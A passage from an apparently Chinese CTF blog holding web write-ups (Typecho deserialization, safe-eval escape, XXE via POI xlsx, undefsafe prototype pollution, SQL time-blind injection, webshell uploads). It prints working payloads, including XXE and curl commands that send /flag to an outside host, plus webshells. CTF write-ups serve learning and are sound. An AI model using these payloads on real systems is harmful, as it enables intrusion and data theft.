上面我们的序列化数据被送进实例化了一个Typeecho_Db类里。跟进下发现构造方法调用了call_user_func()然后call_user_func的参数$adapterName有一个字符串拼接。那说明可以触发__toString.我们全局找下__toString找到var\\Typecho\\Feed.php其魔术方法中有这样一段这里item是遍历items得来的。而items可控。并且由于箭头所指位置调用了screenname属性。因此可能可以触发__get方法全局搜找到var\\Typecho\\Request.php 1234public function __get($key)&#123; return $this-&gt;get($key);&#125; 而get是我们上面要触发__get,是因为调用了screneName属性。那么触发get的话就是对应了$key。可以看到最后被送进_applyFilter的参数值来自params[$key]仍然是可控的最后就是跟进函数了。发现调用call_user_func可以命令执行。参数可控。所以链子到此结束。 poc 12345678910111213141516171819&lt;?phpclass Typecho_Request&#123; private $_params = array('screenName'=&gt;'cat /flag'); private $_filter = array('system');&#125;class Typecho_Feed&#123; private $_type = 'RSS 2.0'; private $_items; public function __construct() &#123; $this-&gt;_items=array(array(\"author\"=&gt;new Typecho_Request())); &#125;&#125;$config=array(\"adapter\"=&gt;new Typecho_Feed(),\"prefix\"=&gt;'byc');echo base64_encode(serialize($config));?&gt; 最后再回到开始提到的问题。想要触发反序列化必须要有个session.不过其实也有好几道题设及到了这个知识点。我们利用php的特性。带上php_session_upload_progress上传文件。并且cookie带上PHPSESSID。就会发现不会触发它提示no, you can&#39;t unserialize it without session QAQ了结果 当然这题不按这个思路来也是可以的。因为get传参start处也有一个反序列化。直接打也没问题。总之这题花的时间是最短的,比赛时没做真的可惜。 EZ三剑客-EzNode这题跟之前做npuctf时的一道node差不多。不过这里直接用的safe-eval库。显然是有poc可逃逸的。但是在这之前肯定有waf要绕。 12345678910111213141516171819202122app.use((req, res, next) =&gt; &#123; if (req.path === '/eval') &#123; let delay = 60 * 1000; console.log(delay); if (Number.isInteger(parseInt(req.query.delay))) &#123; delay = Math.max(delay, parseInt(req.query.delay)); &#125; const t = setTimeout(() =&gt; next(), delay); // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事 setTimeout(() =&gt; &#123; clearTimeout(t); console.log('timeout'); try &#123; res.send('Timeout!'); &#125; catch (e) &#123; &#125; &#125;, 1000); &#125; else &#123; next(); &#125;&#125;); 这里settimout会发现导致我们的payload都无法执行。因此需要绕过,让delay小于1000才能进到safeeval的路由里。https://stackoverflow.com/questions/3468607/why-does-settimeout-break-for-large-millisecond-delay-values这里存在一个issue。就是我们传入的delay如果大小超过32位，会被settimeout设为1.这样就满足条件了。后面搜到的safe-eval的poc直接打 1234567891011121314151617181920212223242526272829303132333435363738const theFunction = function () &#123; const f = Buffer.prototype.write; const ft = &#123; length: 10, utf8Write()&#123; &#125; &#125;; function r(i)&#123; var x = 0; try&#123; x = r(i); &#125;catch(e)&#123;&#125; if(typeof(x)!=='number') return x; if(x!==i) return x+1; try&#123; f.call(ft); &#125;catch(e)&#123; return e; &#125; return null; &#125; var i=1; while(1)&#123; try&#123; i=r(i).constructor.constructor(\"return process\")(); break; &#125;catch(x)&#123; i++; &#125; &#125; return i.mainModule.require(\"child_process\").execSync(\"id\").toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted)); 改成IIFE形式直接打。 (function(){xxxxx})() CVE版签到这题我是真的没理解出题人的意思。后面提醒了CVE后还是没理解出题人的意思……结果大部分时间都花在这题上了。 进去后似乎是一个ssrf。然后只有.ctfhub.com才会触发动作的样子。因此判断应该是有个正则了。然后发现header里提示flag在localhost,并且Host要以123结尾。 这里我虽然大概明白后端运行流程，但是还是搞错了出题人的意图。太难受了。运用到的CVE其实就是getheader的CVE。之前BJD刚刚考过。这个函数特点就是会去请求并返回header.但是CVE告诉我们,如果是用%00截断,就可能让命令去请求用户的可控网址。 在了解到这个CVE后，我以为是要返回头里的Host为123结束。结果最后才知道原来是要请求127.0.0.123。。。不知道说啥,只能说自己把提示搞成要绕的waf了。payloadurl=http://127.0.0.123%00.ctfhub.com 小结这次比赛虽然后面基本就没花时间了，但是收获挺大的.至少发现自己临场变通的能力还是很差就跟平时学业一样…不过还是得稳扎稳打吧。最后还剩一场RCTF这个学期就要暂时跟CTF说再见了。争取能再发挥的稳一点。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"}]},{"title":"网鼎杯-青龙组-WEB-writeup","slug":"网鼎杯-青龙组-WEB-writeup","date":"2020-05-10T09:24:43.000Z","updated":"2021-02-18T05:08:40.269Z","comments":true,"path":"2020/05/10/网鼎杯-青龙组-WEB-writeup/","link":"","permalink":"https://www.bycsec.top/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/","excerpt":"网鼎青龙组成功挺进线下,当然要感谢队友们的给力发挥,X1c两只队也能成功会师半决赛了.(就是对我这样的awd小白而言估计又是去当炮灰了) 说下比赛感受吧。老实说web手比赛体验并不好。开赛到12点才出现第一道WEB题.而这之前唯一一个签到靶机题我开了一个小时都是坏的…然后是比赛氛围,老实说明眼人应该都看得出来了。中间py什么的就不多说了。java那题我眼睁睁看着5分钟内涨了几十解。至于其他几个二进制的题更不用提,做出来的人数就是铁证了。最后五分钟内，十几秒时间我们队掉了十多名然后又蹦回来了就很迷。然后动态靶机一队只能开一个,老实说很大程度上束缚了开题的节奏。 比赛难度倒还能接受。按郁师傅说的,这次没ak web不太应该。当然其实是最后看着只剩10多分钟时名次稳了就做不动了.赛后复现最后一个题时也发现确实不改完没做出来的。总之这里把所有WEB题解都记录下吧。","text":"网鼎青龙组成功挺进线下,当然要感谢队友们的给力发挥,X1c两只队也能成功会师半决赛了.(就是对我这样的awd小白而言估计又是去当炮灰了) 说下比赛感受吧。老实说web手比赛体验并不好。开赛到12点才出现第一道WEB题.而这之前唯一一个签到靶机题我开了一个小时都是坏的…然后是比赛氛围,老实说明眼人应该都看得出来了。中间py什么的就不多说了。java那题我眼睁睁看着5分钟内涨了几十解。至于其他几个二进制的题更不用提,做出来的人数就是铁证了。最后五分钟内，十几秒时间我们队掉了十多名然后又蹦回来了就很迷。然后动态靶机一队只能开一个,老实说很大程度上束缚了开题的节奏。 比赛难度倒还能接受。按郁师傅说的,这次没ak web不太应该。当然其实是最后看着只剩10多分钟时名次稳了就做不动了.赛后复现最后一个题时也发现确实不改完没做出来的。总之这里把所有WEB题解都记录下吧。 AreUserialize今日玄学题。首先是源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(\"flag.php\");highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == \"1\") &#123; $this-&gt;write(); &#125; else if($this-&gt;op == \"2\") &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(\"Bad Hacker!\"); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(\"Too long!\"); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(\"Successful!\"); else $this-&gt;output(\"Failed!\"); &#125; else &#123; $this-&gt;output(\"Failed!\"); &#125; &#125; private function read() &#123; $res = \"\"; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo \"[Result]: &lt;br&gt;\"; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === \"2\") $this-&gt;op = \"1\"; $this-&gt;content = \"\"; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;'str'&#125;)) &#123; $str = (string)$_GET['str']; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 功能上有一个任意写跟任意读。只需要过一个valid函数检查就能反序列化。op的值决定了读/写功能。 首先析构函数明显是入手点。但是他限制了当op为&quot;2&quot;时令op为&quot;1&quot;也就是写功能。然后又置内容为空。跟进到process()函数看下,会明显的发现它采用了$this-&gt;op == &quot;2&quot;这样的弱类型相等判断。那么漏洞很明显了,我们可以利用弱类型比较绕过析构函数的限制,达成任意文件读取。 不过注意的是,原题的Filehandler类属性都是protected,表现出来的结果就是序列化数据有空字符。而这是过不了is_valid()的检查的 但是不要紧。php7.2+版本下反序列化并不在乎你传入的数据属性是否是protected。所以我们改成public即可。 12345678910&lt;?phpclass FileHandler &#123; public $op = 2; public $filename = \"file:///web/html/flag.php\";&#125;$o = new FileHandler();echo urlencode(serialize($o)); 2==&quot;2&quot;,&quot;2e0&quot;==&quot;2&quot;这种技巧不用多说了。这里要解释的是比较坑的后面的filename。开始直接伪协议读flag.php读不到。这个从源码角度讲完全没道理。然后只能尝试用绝对路径读了。基于我们其他文件都能轻松读到,我们先构造个404看看这是什么服务器。发现是 Alpine的镜像。于是查了波其web路径的配置/web/config/httpd.conf然后得到web路径后换绝对路径就读到了，玄学问题。 ps：赛后突然想起来原来在做D^3时踩过的一个坑。就是apache的析构函数执行时工作目录可能会变。所以用相对路径读时是获取不到flag.php的.当然这是概率问题、有的人就能直接读到。 filejava这题能出200解我是真没想到的,主要中间那波垂直上分太突兀了。但仔细想我也是那个时间交的flag… 当然题目肯定是简单题。首先进去有一个我开始忽略的信息就是它在upload界面提示flag在/flag、然后随便上传个文件,马上就测出是个任意文件下载 那老套路先从/WEB-INF/web.xml开始 12345678910111213141516171819202122232425262728293031323334353637&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://java.sun.com/xml/ns/javaee\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\" id=\"WebApp_ID\" version=\"2.5\"&gt; &lt;display-name&gt;file_in_java&lt;/display-name&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;upload.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt; &lt;servlet&gt; &lt;description&gt;&lt;/description&gt; &lt;display-name&gt;UploadServlet&lt;/display-name&gt; &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;servlet&gt; &lt;description&gt;&lt;/description&gt; &lt;display-name&gt;ListFileServlet&lt;/display-name&gt; &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/ListFileServlet&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;servlet&gt; &lt;description&gt;&lt;/description&gt; &lt;display-name&gt;DownloadServlet&lt;/display-name&gt; &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 三个Servlet,路径也都给出来了，一个个读然后反编译吧。 这里直接给出含有关键代码的javaUploadServlet.java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.// Jad home page: http://www.geocities.com/kpdus/jad.html// Decompiler options: packimports(3) // Source File Name: UploadServlet.javapackage cn.abc.servlet;import java.io.*;import java.util.*;import javax.servlet.*;import javax.servlet.http.*;import org.apache.commons.fileupload.FileItem;import org.apache.commons.fileupload.FileUploadException;import org.apache.commons.fileupload.disk.DiskFileItemFactory;import org.apache.commons.fileupload.servlet.ServletFileUpload;import org.apache.poi.openxml4j.exceptions.InvalidFormatException;import org.apache.poi.ss.usermodel.*;public class UploadServlet extends HttpServlet&#123; public UploadServlet() &#123; &#125; protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doPost(request, response); &#125; protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; String savePath; File tempFile; String message; savePath = getServletContext().getRealPath(\"/WEB-INF/upload\"); String tempPath = getServletContext().getRealPath(\"/WEB-INF/temp\"); tempFile = new File(tempPath); if(!tempFile.exists()) tempFile.mkdir(); message = \"\"; ServletFileUpload upload; DiskFileItemFactory factory = new DiskFileItemFactory(); factory.setSizeThreshold(0x19000); factory.setRepository(tempFile); upload = new ServletFileUpload(factory); upload.setProgressListener(new Object() /* anonymous class not found */ class _anm1 &#123;&#125;); upload.setHeaderEncoding(\"UTF-8\"); upload.setFileSizeMax(0x100000L); upload.setSizeMax(0xa00000L); if(!ServletFileUpload.isMultipartContent(request)) return; try &#123; List list = upload.parseRequest(request); Iterator iterator = list.iterator(); do &#123; if(!iterator.hasNext()) break; FileItem fileItem = (FileItem)iterator.next(); if(fileItem.isFormField()) &#123; String name = fileItem.getFieldName(); String s = fileItem.getString(\"UTF-8\"); &#125; else &#123; String filename = fileItem.getName(); if(filename != null &amp;&amp; !filename.trim().equals(\"\")) &#123; String fileExtName = filename.substring(filename.lastIndexOf(\".\") + 1); InputStream in = fileItem.getInputStream(); if(filename.startsWith(\"excel-\") &amp;&amp; \"xlsx\".equals(fileExtName)) try &#123; Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); &#125; catch(InvalidFormatException e) &#123; System.err.println(\"poi-ooxml-3.10 has something wrong\"); e.printStackTrace(); &#125; String saveFilename = makeFileName(filename); request.setAttribute(\"saveFilename\", saveFilename); request.setAttribute(\"filename\", filename); String realSavePath = makePath(saveFilename, savePath); FileOutputStream out = new FileOutputStream((new StringBuilder()).append(realSavePath).append(\"/\").append(saveFilename).toString()); byte buffer[] = new byte[1024]; for(int len = 0; (len = in.read(buffer)) &gt; 0;) out.write(buffer, 0, len); in.close(); out.close(); message = \"\\u6587\\u4EF6\\u4E0A\\u4F20\\u6210\\u529F!\"; &#125; &#125; &#125; while(true); &#125; catch(FileUploadException e) &#123; e.printStackTrace(); &#125; request.setAttribute(\"message\", message); request.getRequestDispatcher(\"/ListFileServlet\").forward(request, response); return; &#125; private String makeFileName(String filename) &#123; return (new StringBuilder()).append(UUID.randomUUID().toString()).append(\"_\").append(filename).toString(); &#125; private String makePath(String filename, String savePath) &#123; int hashCode = filename.hashCode(); int dir1 = hashCode &amp; 0xf; int dir2 = (hashCode &amp; 0xf0) &gt;&gt; 4; String dir = (new StringBuilder()).append(savePath).append(\"/\").append(dir1).append(\"/\").append(dir2).toString(); File file = new File(dir); if(!file.exists()) file.mkdirs(); return dir; &#125; private static final long serialVersionUID = 1L;&#125; 实话说,第一步读完后看了眼所有的源码。没看出什么端倪。(其实是看漏了)第一想法是幽灵猫。但是问了下队友说8009端口不是开的就作罢。然后想利用刚刚的任意文件下载读flag.却发现被定位到404了。仔细看源码会发现DownloadServlet.java 123456if(fileName != null &amp;&amp; fileName.toLowerCase().contains(\"flag\")) &#123; request.setAttribute(\"message\", \"\\u7981\\u6B62\\u8BFB\\u53D6\"); request.getRequestDispatcher(\"/message.jsp\").forward(request, response); return; &#125; 果然过滤了关键字。需要其他方法读flag. 此时回过头发现uploadservlet有一段突兀的源码 123456789101112if(filename.startsWith(\"excel-\") &amp;&amp; \"xlsx\".equals(fileExtName)) try &#123; Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); &#125; catch(InvalidFormatException e) &#123; System.err.println(\"poi-ooxml-3.10 has something wrong\"); e.printStackTrace(); &#125; 我第一想法是想到之前曾经看过但没做过的swpuctf web5.那道题是我第一次见过能用xlsx打xxe的类型。而它用到的就是一个很老的cve,CVE-2014-3529. 而这部分代码逻辑表示，如果我们的文件名是excel-开始加上.xlsx结尾，就会用poi解析xlsx。而这个CVE的poi版本恰好是poi-ooxml-3.10 那就不用说了,先试着按流程构造下payload。注意,这里构造payload时最好在zip中打开我们需要修改的[Content-Types].xml。否则可能会出错。这是我听同学说才知道有这种玄学问题。我个人是先将xlsx改为zip,然后winrar直接打开修改xml的poc。最后再改回来。这样应该就没啥问题了。 发现vps能收到请求。那就直接xxe盲打一把梭了。poc 123456&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM \"http://xxxxxx/1.xml\"&gt;%int;%all;%send;]&gt; vps上的1.xml 12&lt;!ENTITY % payl SYSTEM \"file:///flag\"&gt;&lt;!ENTITY % all \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://xxxxxxxx/?%payl;'&gt;\"&gt; 监听80端口收到flag notes源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143var express = require('express');var path = require('path');const undefsafe = require('undefsafe');const &#123; exec &#125; = require('child_process');var app = express();class Notes &#123; constructor() &#123; this.owner = \"whoknows\"; this.num = 0; this.note_list = &#123;&#125;; &#125; write_note(author, raw_note) &#123; this.note_list[(this.num++).toString()] = &#123;\"author\": author,\"raw_note\":raw_note&#125;; &#125; get_note(id) &#123; var r = &#123;&#125; undefsafe(r, id, undefsafe(this.note_list, id)); return r; &#125; edit_note(id, author, raw) &#123; undefsafe(this.note_list, id + '.author', author); undefsafe(this.note_list, id + '.raw_note', raw); &#125; get_all_notes() &#123; return this.note_list; &#125; remove_note(id) &#123; delete this.note_list[id]; &#125;&#125;var notes = new Notes();notes.write_note(\"nobody\", \"this is nobody's first note\");app.set('views', path.join(__dirname, 'views'));app.set('view engine', 'pug');app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(express.static(path.join(__dirname, 'public')));app.get('/', function(req, res, next) &#123; res.render('index', &#123; title: 'Notebook' &#125;);&#125;);app.route('/add_note') .get(function(req, res) &#123; res.render('mess', &#123;message: 'please use POST to add a note'&#125;); &#125;) .post(function(req, res) &#123; let author = req.body.author; let raw = req.body.raw; if (author &amp;&amp; raw) &#123; notes.write_note(author, raw); res.render('mess', &#123;message: \"add note sucess\"&#125;); &#125; else &#123; res.render('mess', &#123;message: \"did not add note\"&#125;); &#125; &#125;)app.route('/edit_note') .get(function(req, res) &#123; res.render('mess', &#123;message: \"please use POST to edit a note\"&#125;); &#125;) .post(function(req, res) &#123; let id = req.body.id; let author = req.body.author; let enote = req.body.raw; if (id &amp;&amp; author &amp;&amp; enote) &#123; notes.edit_note(id, author, enote); res.render('mess', &#123;message: \"edit note sucess\"&#125;); &#125; else &#123; res.render('mess', &#123;message: \"edit note failed\"&#125;); &#125; &#125;)app.route('/delete_note') .get(function(req, res) &#123; res.render('mess', &#123;message: \"please use POST to delete a note\"&#125;); &#125;) .post(function(req, res) &#123; let id = req.body.id; if (id) &#123; notes.remove_note(id); res.render('mess', &#123;message: \"delete done\"&#125;); &#125; else &#123; res.render('mess', &#123;message: \"delete failed\"&#125;); &#125; &#125;)app.route('/notes') .get(function(req, res) &#123; let q = req.query.q; let a_note; if (typeof(q) === \"undefined\") &#123; a_note = notes.get_all_notes(); &#125; else &#123; a_note = notes.get_note(q); &#125; res.render('note', &#123;list: a_note&#125;); &#125;)app.route('/status') .get(function(req, res) &#123; let commands = &#123; \"script-1\": \"uptime\", \"script-2\": \"free -m\" &#125;; for (let index in commands) &#123; exec(commands[index], &#123;shell:'/bin/bash'&#125;, (err, stdout, stderr) =&gt; &#123; if (err) &#123; return; &#125; console.log(`stdout: $&#123;stdout&#125;`); &#125;); &#125; res.send('OK'); res.end(); &#125;)app.use(function(req, res, next) &#123; res.status(404).send('Sorry cant find that!');&#125;);app.use(function(err, req, res, next) &#123; console.error(err.stack); res.status(500).send('Something broke!');&#125;);const port = 8080;app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:$&#123;port&#125;`)) 老实说一开始审完源码没啥收获。大概的思路是,题目已经有了一个命令执行。那么我要是能修改它固定死的命令内容就能任意打了。但是这种达成肯定是要原型链污染的。我没看到merge()之类的函数就没继续想了 然后之后发现这题居然有原题参考的…https://github.com/balsn/ctf_writeup/blob/master/20181124-asisctffinal/README.md#secure-api仔细看了下发现好像几乎一样啊。只有一个undefsafe依赖的区别.然后就发现这个依赖果然存在原型链污染的问题 Prototype Pollution 1234var a = require(\"undefsafe\");var payload = \"__proto__.toString\";a(&#123;&#125;,payload,\"JHU\");console.log(&#123;&#125;.toString); 参照这个例子,我们很快就能找到原型链的污染点在edit_note这。 1234edit_note(id, author, raw) &#123; undefsafe(this.note_list, id + '.author', author); undefsafe(this.note_list, id + '.raw_note', raw); &#125; 然后按wp的payload改就行了 123456789import requestss = requests.session()data=&#123;'raw':'curl 120.27.246.202/?`cat /flag`','id':'__proto__','author':'byc_404'&#125;url='http://bed4f32827b843ca9ad5b763749970dd265f40236d544ada.cloudgame1.ichunqiu.com:8080/'r=s.post(url+'edit_note',json=data)print(r.text)r=s.get(url+\"status\")print(r.text) 这里id污染了后用raw或者author两个属性都能命令执行。当然因为回显的原因我们选择curl外带数据 trace这题没做出来确实不太应该。赛后按郁师傅的思路果然一下就出了。不过也证明sql里的技巧确实不少啊。 首先当然是sql类型.题目只有一个register_do.php,而没有login的功能。测了一会后突然发现，回显变成了WTF???row&gt;20而且你的payload怎么改回显都一致.那么此时可以大致推断下。我们的payload是被拼接进了insert into语句。因此数据库的返回结果才会增多到上限20。 那么首先猜测结构，构造payloadusername=admin&#39;,if(1=1,sleep(5),1))#会发现虽然返回了504。但是的确可以延时.然而再按照这个思路构造盲注payload却发现我们并不能跑出什么结果。此时再访问register_do.php发现row又超出20了. 所以关键就是，我们要想办法不增加结果,同时还能延时。 这里就得膜一波郁师傅了。10分钟不到就能出结果…payload: 11&#39;^if(ascii(substr((select &#96;2&#96; from (select 1,2 union select * from flag)a limit 1,1),1,1))&#x3D;102,pow(9999,100) or sleep(3),pow(9999,100)),&#39;1&#39;)# 既然没有什么waf。我们就把主体部分带上if字句进行时间盲注的判断。但是此时我们让结果同时pow(9999,100)也就是报错一下。那么我们就不用担心语句数超过20的上限。 然后发现表名不知道为什么跑不出来。但是可以直接尝试flag表然后无列名注入。 1select &#96;2&#96; from (select 1,2 union select * from flag)a limit 1,1 exp 1234567891011121314151617181920212223import requestsflag=\"\"for i in range(1,50): print(i) a=0 for j in \"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-\": url = 'http://1ff59e94406f4210a83ac8268a0037c3334b9006071c441b.changame.ichunqiu.com/register_do.php' payload = \"1'^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),\"+str(i)+\",1))=\" + str(ord(j)) + \",pow(99999,100) or sleep(3),pow(99999,100)),'1')#\" data = &#123; 'username': payload, 'password': '321' &#125; r = requests.post(url, data=data) try: r = requests.post(url, data=data, timeout=3.0) except requests.exceptions.ReadTimeout: flag+=j print(flag) a=1 break if a==0: break 老实说最后十几分钟可能不够做出来的吧。但如果更早点敏锐的察觉到这种注入并找到手段就好了…但是这题收获还是不少的。毕竟自己好久没见到insert_into的盲注。手法也生疏了不少。sql注入的技巧学习还要继续加把劲啊。 小结网鼎结束后这个月还有不少其他比赛。不过估计没多少时间花在CTF上了。这个月一方面希望把java,渗透等方面的知识再接触下。然后比赛打好。等下个月差不多就要专注在学业上了。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"De1CTF2020","slug":"De1CTF2020writeup","date":"2020-05-04T12:21:53.000Z","updated":"2021-02-18T05:08:58.948Z","comments":true,"path":"2020/05/04/De1CTF2020writeup/","link":"","permalink":"https://www.bycsec.top/2020/05/04/De1CTF2020writeup/","excerpt":"终于到第二次XCTF了。没想到De1ta的题这次这么顶，果然是出给国际队伍的难度。(膜一波国内外大佬队伍)小绿草这次也就我们大二的几个在打，大家基本都自闭了。WEB自己也只做出两道题，说实话要是自己JAVA的学习计划再提前一点的话说不定能把calc那题出了的…这样也不至于被卡在20名开外。 等wp出来自己争取把能做的题都复现了。","text":"终于到第二次XCTF了。没想到De1ta的题这次这么顶，果然是出给国际队伍的难度。(膜一波国内外大佬队伍)小绿草这次也就我们大二的几个在打，大家基本都自闭了。WEB自己也只做出两道题，说实话要是自己JAVA的学习计划再提前一点的话说不定能把calc那题出了的…这样也不至于被卡在20名开外。 等wp出来自己争取把能做的题都复现了。 checkin这题还算比较简单.就是自己一开始手贱选的mixture去做浪费了不少时间 首先简单上传FUZZ下，会发现限制了filename，filetype以及file的内容其他的都还好。不过内容黑名单里perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents主要是一个ph的问题。对webshell而言,应该只能使用不闭合的短标签了 但是因为文件后缀严格限制，所以只能按照要求上传图片马。现在需要.htaccess来控制解析它。幸运的是，.htaccess并没有被限制不过注意。.htaccess中常见的几种把.jpg解析成php的写法中，php是必不可少的.那就得绕过限制上传 这里就有两种思路了，一种是上传cgi进行getshell,当时简单搜了下发现确实并不需要php出现 但是更简单的是来自XNUCA的非预期解。使用\\直接绕过waf。即使是.htaccess这种说法上不允许换行的文件，它也是支持\\直接换行的，因此轻松bypass 12addtype application&#x2F;x-httpd-p\\hp .jpg 1&lt;?=system('cat /flag'); Hard_Pentest_1做完这题真的是得庆幸自己当初htb做了台windows的靶机。不然连做下去的勇气都没有 比赛时没咋截图,将就下看吧首先第一步是给出的上传源码 12345678910111213141516171819202122232425262728293031323334353637&lt;?php//Clear the uploads directory every hourhighlight_file(__FILE__);$sandbox = \"uploads/\". md5(\"De1CTF2020\".$_SERVER['REMOTE_ADDR']);@mkdir($sandbox);@chdir($sandbox);if($_POST[\"submit\"])&#123; if (($_FILES[\"file\"][\"size\"] &lt; 2048) &amp;&amp; Check())&#123; if ($_FILES[\"file\"][\"error\"] &gt; 0)&#123; die($_FILES[\"file\"][\"error\"]); &#125; else&#123; $filename=md5($_SERVER['REMOTE_ADDR']).\"_\".$_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $filename); echo \"save in:\" . $sandbox.\"/\" . $filename; &#125; &#125; else&#123; echo \"Not Allow!\"; &#125;&#125;function Check()&#123; $BlackExts = array(\"php\"); $ext = explode(\".\", $_FILES[\"file\"][\"name\"]); $exts = trim(end($ext)); $file_content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]); if(!preg_match('/[a-z0-9;~^`&amp;|]/is',$file_content) &amp;&amp; !in_array($exts, $BlackExts) &amp;&amp; !preg_match('/\\.\\./',$_FILES[\"file\"][\"name\"])) &#123; return true; &#125; return false;&#125;?&gt; webshell的限制,主要是文件后缀跟内容。自己一开始的想法是正则回溯绕下!preg_match()但是很快就发现文件太大传不上去。而且webshell连分号都没了,不好构造。经队友提醒是台windows靶机,可以利用windwos不区分大小写的特性上传。同时内容可以参考XCTFFINALlfi,用全短标签构造无字母数字webshell大概是下面这样的吧,当时自己写的用不出来，借了郁师傅的直接上车。 1&lt;?=$_=[]?&gt;&lt;?=$_=@\"$_\"?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?= 